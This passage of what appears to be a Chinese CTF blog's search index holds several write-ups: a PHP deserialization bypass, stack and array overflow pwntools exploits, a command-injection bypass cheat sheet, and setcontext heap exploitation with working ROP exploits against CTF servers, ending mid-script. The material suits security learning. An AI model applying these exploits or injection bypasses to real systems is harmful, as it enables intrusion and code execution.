[&quot;__PHP_Incomplete_Class_Name&quot;]=&gt;    string(1) &quot;A&quot;    [&quot;name&quot;]=&gt;    string(3) &quot;dzh&quot;  &#125;  [1]=&gt;  object(__PHP_Incomplete_Class)#2 (1) &#123;    [&quot;name&quot;]=&gt;    string(5) &quot;dzhsb&quot;  &#125;&#125;array(2) &#123;  [0]=&gt;  object(__PHP_Incomplete_Class)#1 (2) &#123;    [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt;    string(1) &quot;A&quot;    [&quot;name&quot;]=&gt;    string(3) &quot;dzh&quot;  &#125;  [1]=&gt;  object(__PHP_Incomplete_Class)#2 (0) &#123;  &#125;&#125;\n\n可以发现在经过一次反序列化然后序列化再一次反序列化之后，下面我们所创建的对象的属性已经不见了，那是因为，找不到__PHP_Incomplete_Class_Name这个属性，所以php直接将这个摧毁了。这种绕过方式在一些题目中可以找到。\n// index.php&lt;?phperror_reporting(0);include &quot;function.php&quot;;$res = unserialize($_POST[&#x27;d1no&#x27;]);if (preg_match(&#x27;/H3rmesk1t/i&#x27;, serialize($res))) &#123;    echo &quot;What??? try again!!!&quot; . PHP_EOL; // 这里其实存在问题的，应该直接抛出错误，要是直接echo的话会让上面的反序列化照常可以进行&#125;// function.php&lt;?phpfunction __autoload($coolClass)&#123;    require_once &quot;./$coolClass.php&quot;;&#125;// H3rmesk1t.php&lt;?phpclass Dino&#123;    public $var1;    public $var2;    function __construct($var1, $var2)    &#123;        $var1 = $var1;        $var2 = $var2;    &#125;    function __destruct()    &#123;        echo md5($this-&gt;var1) . &quot;\\n&quot;;        echo md5($this-&gt;var2) . &quot;\\n&quot;;        if (($this-&gt;var1 != $this-&gt;var2) &amp;&amp; (md5($this-&gt;var1) === md5($this-&gt;var2)) &amp;&amp; (sha1($this-&gt;var1) === sha1($this-&gt;var2))) &#123;            eval($this-&gt;var1);        &#125;    &#125;&#125;\n\n解题思路：\n// 首先必要的是绕过&quot;if (($this-&gt;var1 != $this-&gt;var2) &amp;&amp; (md5($this-&gt;var1) === md5($this-&gt;var2)) &amp;&amp; (sha1($this-&gt;var1) === sha1($this-&gt;var2)))&quot;这条if语句;// 因为md5和sha1同时绕过的话，即便是碰撞也无能为力。所以寻找可以利用的原声类()&lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123;    $methods = get_class_methods($class);    if (in_array(&#x27;toString&#x27;, $methods)) &#123;        echo $class;    &#125;&#125;// 通过这个方法找到已申明的类当中是否存在__toString方法// 然后这里选用的是Exception这个类，他的__toString返回值是输入的msg，所在的文件，所处于的行数。在md5函数还有sha1函数都会执行__toString然后return的值相同就可以绕过，然后修改后面的code值会让两个对象不相同(其实我觉得两个对象即便是不改后面的值也是相同的因为对象会新开辟内存所以不相同)。// 所以最终的exp&lt;?phpclass H3rmesk1t&#123;&#125;class Dino&#123;    public $var1;    public $var2;&#125;class wow&#123;    public $zzz;&#125;$payload = &#x27;?&gt;&lt;?php phpinfo();?&gt;&#x27;;$a = new Exception($payload);$b = new Exception($payload, 1);$x = new Dino();$x-&gt;var1 = $a;$x-&gt;var2 = $b;$y = new wow(); // __php_Incomplete_Class$y-&gt;zzz = new H3rmesk1t();$res = array($y, $x);echo urlencode(preg_replace(&#x27;/wow/&#x27;, &#x27;__php_Incomplete_Class&#x27;, serialize($res)));\n\n\nfast_destruct的怪异行为\n\n上面没有解释为什么需要这么搞。主要原因就是真正需要的函数是__destruct函数，但是反序列化的结果被赋值给了一个变量，就导致，要经过下面的if语句才能执行到destruct，但是如果没有”H3rmesk1t”那就无法通过function.php文件引入H3rmesk1t.php文件就会导致反序列化失败，但是有的话就会抛出错误中断反序列化的进度。所以就需要用到”__PHP_Incomplete_Class”这个对象来实现，根据上面的特性，这个在经过一次反序列化之后，在进行序列化的话就会抛弃内部的元素，达到了绕过的效果。还有一种方式就是fast_destruct。\n&lt;?phpclass A&#123;    public function __destruct()    &#123;        print(&quot;this is A::destruct\\n&quot;);        $this-&gt;dzhsb-&gt;c();    &#125;&#125;class B&#123;    public function __call($f, $p)    &#123;        print(&quot;this is B::__call\\n&quot;);    &#125;    public function __wakeup()    &#123;        print(&quot;this is B::__wakeup\\n&quot;);    &#125;    public function __destruct()    &#123;        print(&quot;this is B::__destruct\\n&quot;);    &#125;&#125;unserialize(&#x27;O:1:&quot;A&quot;:1:&#123;s:5:&quot;dzhsb&quot;;O:1:&quot;B&quot;:0:&#123;&#125;&#125;&#x27;);==============================================================================================================================this is B::__wakeupthis is A::destructthis is B::__callthis is B::__destruct==============================================================================================================================&lt;?phpclass A&#123;    public function __destruct()    &#123;        print(&quot;this is A::destruct\\n&quot;);        $this-&gt;dzhsb-&gt;c();    &#125;&#125;class B&#123;    public function __call($f, $p)    &#123;        print(&quot;this is B::__call\\n&quot;);    &#125;    public function __wakeup()    &#123;        print(&quot;this is B::__wakeup\\n&quot;);    &#125;    public function __destruct()    &#123;        print(&quot;this is B::__destruct\\n&quot;);    &#125;&#125;unserialize(&#x27;O:1:&quot;A&quot;:1:&#123;s:5:&quot;dzhsb&quot;;O:1:&quot;B&quot;:0:&#123;&#125;;&#125;&#x27;);==============================================================================================================================PHP Notice:  unserialize(): Error at offset 35 of 37 bytes in /home/tcdy/Download/www/payload.php on line 25this is A::destructthis is B::__callthis is B::__wakeupthis is B::__destruct    // 改变属性的个数也行   O:1:&quot;A&quot;:2:&#123;s:5:&quot;dzhsb&quot;;O:1:&quot;B&quot;:0:&#123;&#125;&#125;\n\n","categories":["web"],"tags":["unserialize"]},{"title":"warmup_csaw_2016","url":"/2021/09/18/warmup-csaw-2016/","content":"下载附件之后的必要操作\n\n文件为64位文件。\n\n发现文件没有开任何保护。\n然后chmod 777 warmup_csaw_2016\n运行程序\n\n发现在wow这里打印除了一个地址。\n查看IDA pro反汇编结果\n__int64 __fastcall main(__int64 a1, char a2, char a3)&#123;  char s;  [rsp+0h] [rbp-80h]  char v5;  [rsp+40h] [rbp-40h]  write(1, -Warm Up-n, 0xAuLL);  write(1, WOW, 4uLL);  sprintf(&amp;s, %pn, sub_40060D);  write(1, &amp;s, 9uLL);  write(1, , 1uLL);  return gets(&amp;v5, ); // gets在c语言里面最容易出现漏洞&#125;\n\n然后在这里看到sprintf打印的就是一个地址点进去看一下\n函数sub_40060D的内容是\nint sub_40060D()&#123;  return system(&quot;cat flag.txt&quot;);&#125;\n\n所以他给了我们拿到flag的地址，只需要通过gets函数改变rip寄存器，跳转到这个函数就可以得到flag\n\n我们上面输入的是aaaa对应的，所以根据函数栈的机制就可以找到偏移量为0x48\n然后直接写exp吧\nfrom pwn import *context(os=&#x27;Linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;DEBUG&#x27;)elf = ELF(&#x27;./questions/warmup_csaw_2016&#x27;)r = remote(&#x27;node4.buuoj.cn&#x27;, 29330)get_flag_addr = 0x40060dpayload = b&#x27;a&#x27;*(0x48) + p64(get_flag_addr)r.sendline(payload)r.interactive()\n\n\n拿到flag!\n","categories":["pwn-buuctf"],"tags":["pwn"]},{"title":"web_command_execution","url":"/2021/09/23/web-command-execution/","content":";     前面的执行完执行后面的|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         ||    当前面的执行出错时（为假）执行后面的&amp;     将任务置于后台执行&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真%0a  （换行）%0d  （回车）\n\n\n\n\n空格绕过\n\n$&#123;IFS&#125;$9&#123;IFS&#125;$IFS$&#123;IFS&#125;$IFS$1 //$1改成$加其他数字貌似都行IFS&lt; &lt;&gt; &#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来%20   (space)%09   (tab)X=$&#x27;cat\\x09./flag.php&#x27;;$X       （\\x09表示tab，也可以用\\x20）\n\n\n\n在命令执行时，需要绕过空格使用&lt;/符号\ncat&lt;/flagcat&lt;/home/tcdy/duyu/test.php\n\n\n绕过黑名单\n\n┌──(tcdy㉿Debian)-[~]└─$ a=f;b=l;c=a;d=g                                                                                                                                                                                                                                    ┌──(tcdy㉿Debian)-[~]└─$ cat $a$b$c$d   this is a test                                                                                                                                                                                                                                            ┌──(tcdy㉿Debian)-[~]└─$ cat flag    this is a test\n\n这次攒的不多\n","categories":["web"],"tags":["命令执行"]},{"title":"xctf_stack2","url":"/2021/09/24/xctf-stack2/","content":"程序的保护与流程\n保护几乎全开了，直接看程序执行流程\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v3; // eax  unsigned int v5; // [esp+18h] [ebp-90h]  unsigned int v6; // [esp+1Ch] [ebp-8Ch]  int v7; // [esp+20h] [ebp-88h]  unsigned int j; // [esp+24h] [ebp-84h]  int v9; // [esp+28h] [ebp-80h]  unsigned int i; // [esp+2Ch] [ebp-7Ch]  unsigned int k; // [esp+30h] [ebp-78h]  unsigned int l; // [esp+34h] [ebp-74h]  char v13[100]; // [esp+38h] [ebp-70h]  unsigned int v14; // [esp+9Ch] [ebp-Ch]  v14 = __readgsdword(0x14u);  setvbuf(stdin, 0, 2, 0);  setvbuf(stdout, 0, 2, 0);  v9 = 0;  puts(&quot;***********************************************************&quot;);  puts(&quot;*                      An easy calc                       *&quot;);  puts(&quot;*Give me your numbers and I will return to you an average *&quot;);  puts(&quot;*(0 &lt;= x &lt; 256)                                           *&quot;);  puts(&quot;***********************************************************&quot;);  puts(&quot;How many numbers you have:&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v5);  puts(&quot;Give me your numbers&quot;);  for ( i = 0; i &lt; v5 &amp;&amp; (signed int)i &lt;= 99; ++i )  &#123;    __isoc99_scanf(&quot;%d&quot;, &amp;v7);    v13[i] = v7;  &#125;  for ( j = v5; ; printf(&quot;average is %.2lf\\n&quot;, (double)((long double)v9 / (double)j)) )  &#123;    while ( 1 )    &#123;      while ( 1 )      &#123;        while ( 1 )        &#123;          puts(&quot;1. show numbers\\n2. add number\\n3. change number\\n4. get average\\n5. exit&quot;);          __isoc99_scanf(&quot;%d&quot;, &amp;v6);          if ( v6 != 2 )            break;          puts(&quot;Give me your number&quot;);          __isoc99_scanf(&quot;%d&quot;, &amp;v7);          if ( j &lt;= 0x63 )          &#123;            v3 = j++;            v13[v3] = v7;          &#125;        &#125;        if ( v6 &gt; 2 )          break;        if ( v6 != 1 )          return 0;        puts(&quot;id\\t\\tnumber&quot;);        for ( k = 0; k &lt; j; ++k )          printf(&quot;%d\\t\\t%d\\n&quot;, k, v13[k]);      &#125;      if ( v6 != 3 )        break;      puts(&quot;which number to change:&quot;);      __isoc99_scanf(&quot;%d&quot;, &amp;v5);      puts(&quot;new number:&quot;);      __isoc99_scanf(&quot;%d&quot;, &amp;v7);      v13[v5] = v7;    &#125;    if ( v6 != 4 )      break;    v9 = 0;    for ( l = 0; l &lt; j; ++l )      v9 += v13[l];  &#125;  return 0;&#125;\n\n流程主要就是，选择你要往数组里面加几个数字，然后输入，然后有四个选项，分别是，查看数字，添加数字，改变数字，获得平均数，最后就是结束。\n分析漏洞浏览全篇没有read和gets等函数来实现栈溢出，再就是有Canary保护。\n漏洞位置:\nputs(&quot;which number to change:&quot;);__isoc99_scanf(&quot;%d&quot;, &amp;v5);puts(&quot;new number:&quot;);__isoc99_scanf(&quot;%d&quot;, &amp;v7);\n\n找到偏移量这里没有限制数组的边境，就可以造成任意地址更改的漏洞。\n\n静态调试的时候会的出偏移量是0x74，但是这样直接跑就出错了。\nemmm我也不知道为什么，后面看了博客，发现要找到数组的起始地址和ret地址\n\n函数在执行到v13[v5]=v7的时候就是上面的汇编代码。整个执行流程就是，\nscanf的时候就将数据存在栈上面，然后把数据放到EDX寄存器，再把DL的数据放到ebp+eax-0x70的位置，也就是栈上面。然后就是找ret函数\n\n执行到ret，所以此时的rsp就是ret的地址\nemmmL:开始一直没想清楚为什么会出现ret地址不是ebp+4，很多博客都没写清楚，问了学长那态度问过的都知道。\nhttps://muzibing.github.io/2020/06/08/2020.06.08(123)/\n这个博主解释了，是因为开启了canary的缘故\n解决完这个难题后面就简单了，题目有一个欺骗人的函数hackhere里面的参数是’/bin/bash’所以get不到shell，然后就直接自己构造吧。\ngetshell直接上exp\nfrom platform import systemfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;x86&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./questions/3fb1a42837be485aae7d85d11fbc457b&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 53021)# r = process(&#x27;./questions/3fb1a42837be485aae7d85d11fbc457b&#x27;)system_addr = [0x50, 0x84, 0x04, 0x08]sh_addr = [0x87, 0x89, 0x04, 0x08]offset = 0x84r.recvuntil(b&#x27;How many numbers you have:\\n&#x27;)r.sendline(b&#x27;1&#x27;)r.recvuntil(b&#x27;Give me your numbers\\n&#x27;)r.sendline(b&#x27;1&#x27;)def attack(addr, value):    r.recvuntil(b&#x27;5. exit\\n&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;which number to change:\\n&#x27;)    r.sendline(str(addr).encode(&#x27;utf8&#x27;))    r.recvuntil(b&#x27;new number:\\n&#x27;)    r.sendline(str(value).encode(&#x27;utf8&#x27;))for i in range(4):    attack(offset+i, system_addr[i])offset += 8for j in range(4):    attack(offset+j, sh_addr[j])r.recvuntil(b&#x27;5. exit\\n&#x27;)r.sendline(b&#x27;5&#x27;)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["ROP","stack overflow"]},{"title":"从两道题目看setcontext","url":"/2022/03/10/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E7%9B%AE%E7%9C%8Bsetcontext/","content":"\n现在的比赛，越来越卷了，所以出题人为了让选手难受一般都会开始沙盒这时候只能进行orw，不过在栈里面这种方式还是常见。但是在堆利用当中我们更多的是修改hook为system或者one_gadget，为了能够实现orw就出现了新的手法 堆中栈迁移\n\nGlibc2.29以下首先先看一下在glibc2.29以下的此类利用方式\n0x00007f1c03351180 &lt;+0&gt;:\tpush   rdi0x00007f1c03351181 &lt;+1&gt;:\tlea    rsi,[rdi+0x128]0x00007f1c03351188 &lt;+8&gt;:\txor    edx,edx0x00007f1c0335118a &lt;+10&gt;:\tmov    edi,0x20x00007f1c0335118f &lt;+15&gt;:\tmov    r10d,0x80x00007f1c03351195 &lt;+21&gt;:\tmov    eax,0xe0x00007f1c0335119a &lt;+26&gt;:\tsyscall 0x00007f1c0335119c &lt;+28&gt;:\tpop    rdi0x00007f1c0335119d &lt;+29&gt;:\tcmp    rax,0xfffffffffffff0010x00007f1c033511a3 &lt;+35&gt;:\tjae    0x7f1c03351200 &lt;setcontext+128&gt;0x00007f1c033511a5 &lt;+37&gt;:\tmov    rcx,QWORD PTR [rdi+0xe0]0x00007f1c033511ac &lt;+44&gt;:\tfldenv [rcx]0x00007f1c033511ae &lt;+46&gt;:\tldmxcsr DWORD PTR [rdi+0x1c0]0x00007f1c033511b5 &lt;+53&gt;:\tmov    rsp,QWORD PTR [rdi+0xa0]0x00007f1c033511bc &lt;+60&gt;:\tmov    rbx,QWORD PTR [rdi+0x80]0x00007f1c033511c3 &lt;+67&gt;:\tmov    rbp,QWORD PTR [rdi+0x78]0x00007f1c033511c7 &lt;+71&gt;:\tmov    r12,QWORD PTR [rdi+0x48]0x00007f1c033511cb &lt;+75&gt;:\tmov    r13,QWORD PTR [rdi+0x50]0x00007f1c033511cf &lt;+79&gt;:\tmov    r14,QWORD PTR [rdi+0x58]0x00007f1c033511d3 &lt;+83&gt;:\tmov    r15,QWORD PTR [rdi+0x60]0x00007f1c033511d7 &lt;+87&gt;:\tmov    rcx,QWORD PTR [rdi+0xa8]0x00007f1c033511de &lt;+94&gt;:\tpush   rcx0x00007f1c033511df &lt;+95&gt;:\tmov    rsi,QWORD PTR [rdi+0x70]0x00007f1c033511e3 &lt;+99&gt;:\tmov    rdx,QWORD PTR [rdi+0x88]0x00007f1c033511ea &lt;+106&gt;:\tmov    rcx,QWORD PTR [rdi+0x98]0x00007f1c033511f1 &lt;+113&gt;:\tmov    r8,QWORD PTR [rdi+0x28]0x00007f1c033511f5 &lt;+117&gt;:\tmov    r9,QWORD PTR [rdi+0x30]0x00007f1c033511f9 &lt;+121&gt;:\tmov    rdi,QWORD PTR [rdi+0x68]0x00007f1c033511fd &lt;+125&gt;:\txor    eax,eax0x00007f1c033511ff &lt;+127&gt;:\tret    \n\n可以看到这里是以rdi为基地址向其他寄存器写入值，并且这里可以控制rsp和rip，虽然上面没有直接向rip写，但是上面是先写在rcx再将rcx进栈随后ret，所以rcx的值其实也就是最后rip的值。\nCISCN2021-silverwolf题目的代码很清晰，流程很容易分析所以自己下去分析一下\nunsigned __int64 delete()&#123;  __int64 v1; // [rsp+0h] [rbp-18h] BYREF  unsigned __int64 v2; // [rsp+8h] [rbp-10h]  v2 = __readfsqword(0x28u);  __printf_chk(1LL, &quot;Index: &quot;);  __isoc99_scanf(&amp;unk_1144, &amp;v1);  if ( !v1 &amp;&amp; chunk )    free(chunk);  return __readfsqword(0x28u) ^ v2;&#125;\n\ndelete存在很明显的UAF漏洞，泄漏heap地址和libc地址这里就不在赘述，这里提一下tcache double free的检测，这道提的libc版本是2.27-3ubuntu1.3虽然是2.27但是已经加了检测机制，所以可以当作2.29来打，这里先看一下检测的源码\ntcache_put (mchunkptr chunk, size_t tc_idx)&#123;  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  assert (tc_idx &lt; TCACHE_MAX_BINS);  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will     detect a double free.  */  e-&gt;key = tcache;  e-&gt;next = tcache-&gt;entries[tc_idx];  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);&#125;\n\n可以看到我们chunk进入tcache之后会将key位其实也就是bk位设置为tcache地址\nif (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)&#123;    /* Check to see if it&#x27;s already in the tcache.  */    tcache_entry *e = (tcache_entry *) chunk2mem (p);    /* This test succeeds on double free.  However, we don&#x27;t 100%\t   trust it (it also matches random payload data at a 1 in\t   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely\t   coincidence before aborting.  */    if (__glibc_unlikely (e-&gt;key == tcache))    &#123;        tcache_entry *tmp;        LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);        for (tmp = tcache-&gt;entries[tc_idx];             tmp;             tmp = tmp-&gt;next)            if (tmp == e)                malloc_printerr (&quot;free(): double free detected in tcache 2&quot;);        /* If we get here, it was a coincidence.  We&#x27;ve wasted a\t       few cycles, but don&#x27;t abort.  */    &#125;    if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)    &#123;        tcache_put (p, tc_idx);        return;    &#125;r.recvuntil(b&#x27;Please input index?&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))&#125;\n\n然后再验证free的chunk的key位是否为tcache地址，所以只需要覆盖掉就好了。\n所以思路就很简单了，只需要通过double free控制tcache struct，然后覆盖掉free_hook为setcontext+53，不过需要注意的是这里的堆能写入的最大值为0x78所以，我们在构造rdi+0xa0和rdi+0xa8时需要用到两个chunk，还有一点很坑的就是在进行rop时不能直接调用open\n0x00007f1c0340ed49 &lt;+57&gt;:\ttest   eax,eax0x00007f1c0340ed4b &lt;+59&gt;:\tjne    0x7f1c0340edb6 &lt;__libc_open64+166&gt;0x00007f1c0340ed4d &lt;+61&gt;:\tmov    edx,esi0x00007f1c0340ed4f &lt;+63&gt;:\tmov    eax,0x1010x00007f1c0340ed54 &lt;+68&gt;:\tmov    rsi,rdi0x00007f1c0340ed57 &lt;+71&gt;:\tmov    edi,0xffffff9c0x00007f1c0340ed5c &lt;+76&gt;:\tsyscall \n\n反汇编存在以下几行，这里进行syscall时rax其实并不是2\n&gt;&gt; seccomp-tools dump ./silverwolf line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009 0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008 0006: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0008 0007: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0009 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0009: 0x06 0x00 0x00 0x00000000  return KILL\n\n可以看到这里的沙盒限制了，所以直接使用地址调用open是不行的需要自己赋值rax，最后这里给出上面题目的exp\nfrom pwn import *elf = ELF(&#x27;./silverwolf&#x27;)# r = process(&#x27;./silverwolf&#x27;)r = remote(&#x27;1.14.71.254&#x27;, 28017)libc = ELF(&#x27;./libc-2.27.so&#x27;)context.arch = &#x27;amd64&#x27;def menu(options):    r.recvuntil(b&#x27;Your choice: &#x27;)    r.sendline(bytes(str(options), encoding=&#x27;utf-8&#x27;))def create(size):    menu(1)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(b&#x27;0&#x27;)    r.recvuntil(b&#x27;Size: &#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))def edit(content):    menu(2)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(b&#x27;0&#x27;)    r.recvuntil(b&#x27;Content: &#x27;)    r.sendline(content)def show():    menu(3)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(b&#x27;0&#x27;)def delete():    menu(4)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(b&#x27;0&#x27;)for i in range(12):    create(0x10)create(0x50)for i in range(11):    create(0x60)for i in range(7):    create(0x70)create(0x78)delete()edit(b&#x27;\\x00&#x27;*0x10)delete()show()r.recvuntil(b&#x27;Content: &#x27;)heap_addr = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))heap_base = heap_addr-0x1920print(&quot;heap_base=&gt;&quot;, hex(heap_base))edit(p64(heap_base+0x10))create(0x78)create(0x78)payload = b&#x27;a&#x27;*0x70+p64(0)edit(payload)delete()show()r.recvuntil(b&#x27;Content: &#x27;)main_arena_96 = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]print(&#x27;libc_base=&gt;&#x27;, hex(libc_base))__free_hook = libc_base+libc.symbols[&#x27;__free_hook&#x27;]read_addr = libc_base+libc.symbols[&#x27;read&#x27;]puts_addr = libc_base+libc.symbols[&#x27;puts&#x27;]setcontext_addr = libc_base+libc.symbols[&#x27;setcontext&#x27;]+53syscall_addr = libc_base+next(libc.search(asm(&#x27;syscall\\nret&#x27;)))pop_rdi = libc_base+next(libc.search(asm(&#x27;pop rdi\\nret&#x27;)))pop_rsi = libc_base+next(libc.search(asm(&#x27;pop rsi\\nret&#x27;)))pop_rdx = libc_base+next(libc.search(asm(&#x27;pop rdx\\nret&#x27;)))pop_rax = libc_base+next(libc.search(asm(&#x27;pop rax\\nret&#x27;)))ret_addr = libc_base+next(libc.search(asm(&#x27;ret&#x27;)))payload = b&#x27;\\x02&#x27;+b&#x27;\\x00&#x27;*4+b&#x27;\\x02&#x27;*2+b&#x27;\\x00&#x27;*4+b&#x27;\\x03&#x27;+b&#x27;\\x00&#x27;+b&#x27;\\x02&#x27;payload = payload.ljust(0x40, b&#x27;\\x00&#x27;)+p64(heap_base+0x400)payload = payload.ljust(0x68, b&#x27;\\x00&#x27;)+p64(heap_base+0x1130+0x10) + \\    p64(heap_base+0x1560+0x10)edit(payload)create(0x10)edit(b&#x27;./flag\\x00\\x00&#x27;)flag_addr = heap_base+0x400bss = libc_base+libc.bss()+0x100rop_chain = p64(pop_rdi)+p64(flag_addr)+p64(pop_rax) + \\    p64(constants.SYS_open)+p64(syscall_addr)rop_chain += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss)+p64(pop_rdx) + \\    p64(0x30)+p64(read_addr)rop_chain += p64(pop_rdi)+p64(bss)+p64(puts_addr)create(0x78)delete()edit(p64(libc_base+libc.symbols[&#x27;__free_hook&#x27;]))create(0x78)edit(rop_chain)rop_addr = heap_base+0x1560+0x10create(0x68)delete()edit(p64(heap_base+0x10c0+0x10))create(0x68)edit(b&#x27;\\x00&#x27;*0x30+p64(rop_addr)+p64(ret_addr))create(0x78)edit(p64(setcontext_addr))create(0x68)delete()r.interactive()\n\nGlibc2.29以上0x00007f37b1e420dd &lt;+61&gt;:\tmov    rsp,QWORD PTR [rdx+0xa0]0x00007f37b1e420e4 &lt;+68&gt;:\tmov    rbx,QWORD PTR [rdx+0x80]0x00007f37b1e420eb &lt;+75&gt;:\tmov    rbp,QWORD PTR [rdx+0x78]0x00007f37b1e420ef &lt;+79&gt;:\tmov    r12,QWORD PTR [rdx+0x48]0x00007f37b1e420f3 &lt;+83&gt;:\tmov    r13,QWORD PTR [rdx+0x50]0x00007f37b1e420f7 &lt;+87&gt;:\tmov    r14,QWORD PTR [rdx+0x58]0x00007f37b1e420fb &lt;+91&gt;:\tmov    r15,QWORD PTR [rdx+0x60]\t... ...0x00007f37b1e421c6 &lt;+294&gt;:\tmov    rcx,QWORD PTR [rdx+0xa8]0x00007f37b1e421cd &lt;+301&gt;:\tpush   rcx0x00007f37b1e421ce &lt;+302&gt;:\tmov    rsi,QWORD PTR [rdx+0x70]0x00007f37b1e421d2 &lt;+306&gt;:\tmov    rdi,QWORD PTR [rdx+0x68]0x00007f37b1e421d6 &lt;+310&gt;:\tmov    rcx,QWORD PTR [rdx+0x98]0x00007f37b1e421dd &lt;+317&gt;:\tmov    r8,QWORD PTR [rdx+0x28]0x00007f37b1e421e1 &lt;+321&gt;:\tmov    r9,QWORD PTR [rdx+0x30]0x00007f37b1e421e5 &lt;+325&gt;:\tmov    rdx,QWORD PTR [rdx+0x88]0x00007f37b1e421ec &lt;+332&gt;:\txor    eax,eax0x00007f37b1e421ee &lt;+334&gt;:\tret\n\n可以看到在glibc2.29以上的版本是以rdx作为索引的，这时我们就需要一个gadget可以操作rdx了getkeyserv_handle\n0x00007f3ddba96930 &lt;+576&gt;:\tmov    rdx,QWORD PTR [rdi+0x8]0x00007f3ddba96934 &lt;+580&gt;:\tmov    QWORD PTR [rsp],rax0x00007f3ddba96938 &lt;+584&gt;:\tcall   QWORD PTR [rdx+0x20]\n\n所以此时我们就可以根据rdi继续操作rdx实现栈劫持\n2021DASCTF 3月ParentSimulator题目的流程很是很简单，结构很清晰可以分析出来\nint sub_196B()&#123;  __int64 v0; // rax  int v2; // [rsp+Ch] [rbp-4h]  puts(&quot;Please input index?&quot;);  LODWORD(v0) = input_int();  v2 = v0;  if ( v0 &lt;= 9 )  &#123;    v0 = chunk_arr[v0];    if ( v0 )    &#123;      free(chunk_arr[v2]);      chunk_inuse[v2] = 0;      LODWORD(v0) = puts(&quot;Done&quot;);    &#125;  &#125;  return v0;&#125;\n\n在delete时没有检测chunk_inuse就直接free了\nint sub_1AB0()&#123;  char *v0; // rax  int v2; // [rsp+8h] [rbp-8h]  int v3; // [rsp+Ch] [rbp-4h]  printf(&quot;You only have 1 chances to change your child&#x27;s gender, left: %d\\n&quot;, dword_4010);  LODWORD(v0) = dword_4010;  if ( dword_4010 )  &#123;    puts(&quot;Please input index?&quot;);    LODWORD(v0) = input_int();    v2 = v0;    if ( v0 &lt;= 9 )    &#123;      v0 = chunk_arr[v0];      if ( v0 )      &#123;        --dword_4010;        printf(&quot;Current gender:%s\\n&quot;, (chunk_arr[v2] + 8LL));        puts(&quot;Please rechoose your child&#x27;s gender.\\n1.Boy\\n2.Girl:&quot;);        v3 = input_int();        if ( v3 == 1 )        &#123;          v0 = (chunk_arr[v2] + 8LL);          *v0 = 7958370;        &#125;        else if ( v3 == 2 )        &#123;          v0 = (chunk_arr[v2] + 8LL);          strcpy(v0, &quot;girl&quot;);        &#125;        else        &#123;          LODWORD(v0) = puts(&quot;oho, you choose a invalid gender.&quot;);        &#125;      &#125;    &#125;  &#125;  return v0;&#125;\n\n并且在改变性别时也是没有检测chunk_inuse，而且改变性别的位置正好是bk指针，所以可以实现tcache double free\n解法1：\nfrom pwn import *elf = ELF(&#x27;./pwn&#x27;)r = process(&#x27;./pwn&#x27;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)context.arch = &#x27;amd64&#x27;def menu(option):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.send(bytes(str(option), encoding=&#x27;utf8&#x27;)+b&#x27;\\n&#x27;)def create(idx, gender, name):    menu(1)    r.recvuntil(b&#x27;Please input index?&#x27;)    r.send(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&quot;2.Girl:&quot;)    r.send(bytes(str(gender), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&quot;Please input your child&#x27;s name:&quot;)    r.send(name)def change_name(idx, name):    menu(2)    r.recvuntil(b&#x27;Please input index?&#x27;)    r.send(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&quot;Please input your child&#x27;s new name:&quot;)    r.send(name)def show(idx):    menu(3)    r.recvuntil(b&#x27;Please input index?&#x27;)    r.send(bytes(str(idx), encoding=&#x27;utf8&#x27;))def delete(idx):    menu(4)    r.recvuntil(b&#x27;Please input index?&#x27;)    r.send(bytes(str(idx), encoding=&#x27;utf8&#x27;))def edit(idx, description):    menu(5)    r.recvuntil(b&#x27;Please input index?&#x27;)    r.send(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&quot;description:&quot;)    r.send(description)def 